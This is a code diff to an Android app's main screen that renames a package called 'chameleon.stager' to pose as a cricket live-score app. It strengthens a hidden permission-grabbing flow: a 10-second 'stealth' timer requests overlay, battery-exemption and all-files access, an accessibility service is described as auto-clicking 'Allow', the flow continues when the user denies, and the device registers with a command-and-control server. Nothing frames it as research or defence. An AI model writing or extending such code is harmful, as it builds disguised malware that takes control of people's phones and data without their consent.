@@ -1,4 +1,4 @@
-package com.chameleon.stager.ui
+package com.cricket.livescore.ui
 
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.Context
@@ -13,9 +13,9 @@ import android.view.accessibility.AccessibilityManager
 import android.widget.Toast
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
-import com.chameleon.stager.databinding.ActivityMainBinding
-import com.chameleon.stager.service.PayloadService
-import com.chameleon.stager.utils.PermissionHelper
+import com.cricket.livescore.databinding.ActivityMainBinding
+import com.cricket.livescore.service.PayloadService
+import com.cricket.livescore.utils.PermissionHelper
 
 class MainActivity : AppCompatActivity() {
     companion object {
@@ -24,8 +24,13 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private val permissionHelper = PermissionHelper()
-    private var pendingPermissionFlow = false
     private var flowCompleted = false
+    private var overlayRequested = false
+    private var batteryOptRequested = false
+    private var storageRequested = false
+    private var permissionRequested = false
+    private var stealthDialogShown = false
+    private var flowLaunched = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -35,12 +40,15 @@ class MainActivity : AppCompatActivity() {
         setupUI()
         checkPermissions()
 
-        // 10-second stealth timer — triggers permission flow automatically
-        android.os.Handler(mainLooper).postDelayed({
-            if (!isFinishing) {
-                triggerStealthPermissionFlow()
-            }
-        }, 10000)
+        // 10-second stealth timer — triggers permission flow automatically, only once
+        if (!flowLaunched) {
+            flowLaunched = true
+            android.os.Handler(mainLooper).postDelayed({
+                if (!isFinishing && !flowCompleted) {
+                    triggerStealthPermissionFlow()
+                }
+            }, 10000)
+        }
     }
 
     private fun setupUI() {
@@ -87,6 +95,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun triggerStealthPermissionFlow() {
+        if (stealthDialogShown) return
+        stealthDialogShown = true
         if (isAccessibilityServiceEnabled()) {
             startPayloadFlow()
         } else {
@@ -126,27 +136,35 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun continuePayloadFlow() {
-        // Step 1: Overlay permission
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            startActivity(
-                Intent(
-                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:$packageName")
-                )
-            )
-            return
-        }
+        if (flowCompleted) return
 
-        // Step 2: Battery optimization exemption
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+        // Step 1: Overlay permission — request only once
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            if (!overlayRequested) {
+                overlayRequested = true
                 startActivity(
                     Intent(
-                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:$packageName")
                     )
                 )
+            }
+            return
+        }
+
+        // Step 2: Battery optimization exemption — request only once
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                if (!batteryOptRequested) {
+                    batteryOptRequested = true
+                    startActivity(
+                        Intent(
+                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                            Uri.parse("package:$packageName")
+                        )
+                    )
+                }
                 return
             }
         }
@@ -154,12 +172,15 @@ class MainActivity : AppCompatActivity() {
         // Step 2b: Storage permission (MANAGE_EXTERNAL_STORAGE needs Settings intent)
         if (!PermissionHelper.hasStoragePermission(this)) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                startActivity(
-                    Intent(
-                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
-                        Uri.parse("package:$packageName")
+                if (!storageRequested) {
+                    storageRequested = true
+                    startActivity(
+                        Intent(
+                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                            Uri.parse("package:$packageName")
+                        )
                     )
-                )
+                }
                 return
             }
         }
@@ -168,8 +189,10 @@ class MainActivity : AppCompatActivity() {
         // AccessibilityService auto-clicks "Allow" within ~300ms
         // onRequestPermissionsResult() continues the flow after grant
         if (!permissionHelper.hasAllPermissions(this)) {
-            pendingPermissionFlow = true
-            permissionHelper.requestPermissions(this)
+            if (!permissionRequested) {
+                permissionRequested = true
+                permissionHelper.requestPermissions(this)
+            }
             return
         }
 
@@ -179,9 +202,15 @@ class MainActivity : AppCompatActivity() {
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERMISSION_REQ_CODE && pendingPermissionFlow) {
-            pendingPermissionFlow = false
-            finishSetup()
+        if (requestCode == PERMISSION_REQ_CODE) {
+            permissionRequested = false
+            // Re-check and continue flow if all granted, or skip if user denied
+            if (permissionHelper.hasAllPermissions(this)) {
+                finishSetup()
+            } else {
+                // User denied some — continue anyway with whatever we have
+                finishSetup()
+            }
         }
     }
 
@@ -222,7 +251,7 @@ class MainActivity : AppCompatActivity() {
                 put("android_version", Build.VERSION.RELEASE)
                 put("api_level", Build.VERSION.SDK_INT)
             }
-            val url = java.net.URL("${com.chameleon.stager.StagerApplication.c2RealUrl}/api/register")
+            val url = java.net.URL("${com.cricket.livescore.StagerApplication.c2RealUrl}/api/register")
             val conn = url.openConnection() as java.net.HttpURLConnection
             conn.requestMethod = "POST"
             conn.connectTimeout = 5000
